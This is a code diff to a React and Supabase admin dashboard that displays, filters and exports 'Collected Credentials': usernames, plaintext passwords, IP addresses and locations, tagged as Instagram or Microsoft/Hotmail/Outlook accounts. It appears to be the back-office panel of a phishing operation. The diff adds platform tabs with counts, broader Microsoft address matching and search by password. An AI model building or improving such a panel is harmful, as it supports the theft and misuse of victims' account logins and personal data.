@@ -74,18 +74,24 @@ export default function AdminDashboard() {
     setLoading(true);
     
     try {
+      console.log('Fetching credentials from Supabase...');
+      
       const { data, error } = await supabase
         .from('users')
         .select('*')
         .order('login_time', { ascending: false });
         
-      if (error) throw error;
+      if (error) {
+        console.error('Supabase error:', error);
+        throw error;
+      }
       
+      console.log('Credentials received:', data);
       setCredentials(data || []);
-      calculateStats(data);
+      calculateStats(data || []);
     } catch (error) {
       console.error('Error fetching credentials:', error);
-      setError('Failed to load data');
+      setError('Failed to load data: ' + error.message);
     } finally {
       setLoading(false);
     }
@@ -124,19 +130,39 @@ export default function AdminDashboard() {
   };
   
   // Filter credentials
-  const filteredCredentials = credentials.filter(cred => {
-    const matchesSearch = 
-      cred.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      cred.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      cred.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      cred.ip_address?.toLowerCase().includes(searchTerm.toLowerCase());
-      
-    if (filter === 'all') return matchesSearch;
-    if (filter === 'instagram') return matchesSearch && cred.username.includes('(IG)');
-    if (filter === 'microsoft') return matchesSearch && (cred.username.includes('(hotmail)') || cred.username.includes('(MS)'));
+  const filterCredentials = () => {
+    if (!credentials) return [];
     
-    return matchesSearch;
-  });
+    let filtered = [...credentials];
+    
+    // Filter by platform
+    if (filter === 'instagram') {
+      filtered = filtered.filter(cred => 
+        cred.username && cred.username.includes('(IG)')
+      );
+    } else if (filter === 'microsoft') {
+      filtered = filtered.filter(cred => 
+        cred.username && (cred.username.includes('(MS)') || 
+        cred.username.includes('(hotmail)') || 
+        cred.username.includes('@hotmail') || 
+        cred.username.includes('@outlook') || 
+        cred.username.includes('@live'))
+      );
+    }
+    
+    // Filter by search term
+    if (searchTerm) {
+      filtered = filtered.filter(cred =>
+        (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.password && cred.password.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase())) ||
+        (cred.ip_address && cred.ip_address.toLowerCase().includes(searchTerm.toLowerCase()))
+      );
+    }
+    
+    return filtered;
+  };
   
   // Export credentials as CSV
   const exportCSV = () => {
@@ -270,26 +296,40 @@ export default function AdminDashboard() {
                   </div>
                 </div>
                 
-                <div className="data-section">
+                <div className="data-container">
                   <div className="data-header">
-                    <h2>Credential Data</h2>
+                    <h2><i className="fas fa-table"></i> Collected Credentials</h2>
+                    
+                    <div className="tabs">
+                      <button 
+                        className={filter === 'all' ? 'tab-active' : ''}
+                        onClick={() => setFilter('all')}
+                      >
+                        All Records
+                      </button>
+                      <button 
+                        className={filter === 'instagram' ? 'tab-active' : ''}
+                        onClick={() => setFilter('instagram')}
+                      >
+                        Instagram <span className="badge">{stats.instagramEntries}</span>
+                      </button>
+                      <button 
+                        className={filter === 'microsoft' ? 'tab-active' : ''}
+                        onClick={() => setFilter('microsoft')}
+                      >
+                        Microsoft <span className="badge">{stats.microsoftEntries}</span>
+                      </button>
+                    </div>
+                    
                     <div className="data-actions">
                       <div className="search">
-                        <input
-                          type="text"
-                          placeholder="Search..."
+                        <i className="fas fa-search"></i>
+                        <input 
+                          type="text" 
+                          placeholder="Search..." 
                           value={searchTerm}
                           onChange={(e) => setSearchTerm(e.target.value)}
                         />
-                        <i className="fas fa-search"></i>
-                      </div>
-                      
-                      <div className="filter">
-                        <select value={filter} onChange={(e) => setFilter(e.target.value)}>
-                          <option value="all">All Platforms</option>
-                          <option value="instagram">Instagram</option>
-                          <option value="microsoft">Microsoft</option>
-                        </select>
                       </div>
                       
                       <button className="export-button" onClick={exportCSV}>
@@ -310,8 +350,8 @@ export default function AdminDashboard() {
                         </tr>
                       </thead>
                       <tbody>
-                        {filteredCredentials.length > 0 ? (
-                          filteredCredentials.map((cred) => (
+                        {filterCredentials().length > 0 ? (
+                          filterCredentials().map((cred) => (
                             <tr key={cred.id} className={cred.username.includes('(IG)') ? 'instagram-row' : 'microsoft-row'}>
                               <td>
                                 {cred.username.includes('(IG)') ? (
@@ -687,14 +727,14 @@ export default function AdminDashboard() {
         }
         
         /* Data Section */
-        .data-section {
+        .data-container {
           background-color: white;
           border-radius: 8px;
           padding: 1.5rem;
           box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
         }
         
-        .dark-mode .data-section {
+        .dark-mode .data-container {
           background-color: var(--dark-card);
           box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
         }
@@ -747,20 +787,6 @@ export default function AdminDashboard() {
           top: 50%;
           transform: translateY(-50%);
           color: var(--gray);
-        }
-        
-        .filter select {
-          padding: 0.5rem;
-          border: 1px solid #eee;
-          border-radius: 4px;
-          background-color: white;
-          font-size: 0.875rem;
-        }
-        
-        .dark-mode .filter select {
-          background-color: #333;
-          border-color: #444;
-          color: white;
         }
         
         .export-button {
@@ -888,6 +914,51 @@ export default function AdminDashboard() {
           cursor: pointer;
           font-size: 12px;
           margin-top: 10px;
+        }
+        
+        .tabs {
+          display: flex;
+          margin-bottom: 1rem;
+          border-bottom: 1px solid #eee;
+          width: 100%;
+        }
+        
+        .dark-mode .tabs {
+          border-bottom-color: #444;
+        }
+        
+        .tabs button {
+          background: none;
+          border: none;
+          padding: 0.5rem 1rem;
+          margin-right: 1rem;
+          font-size: 0.875rem;
+          color: var(--gray);
+          border-bottom: 2px solid transparent;
+          cursor: pointer;
+        }
+        
+        .tabs button:hover {
+          color: var(--primary);
+        }
+        
+        .tab-active {
+          color: var(--primary) !important;
+          border-bottom: 2px solid var(--primary) !important;
+          font-weight: 500;
+        }
+        
+        .badge {
+          display: inline-block;
+          background-color: #eee;
+          border-radius: 12px;
+          padding: 2px 6px;
+          font-size: 0.75rem;
+          margin-left: 5px;
+        }
+        
+        .dark-mode .badge {
+          background-color: #333;
         }
       `}</style>
     </>
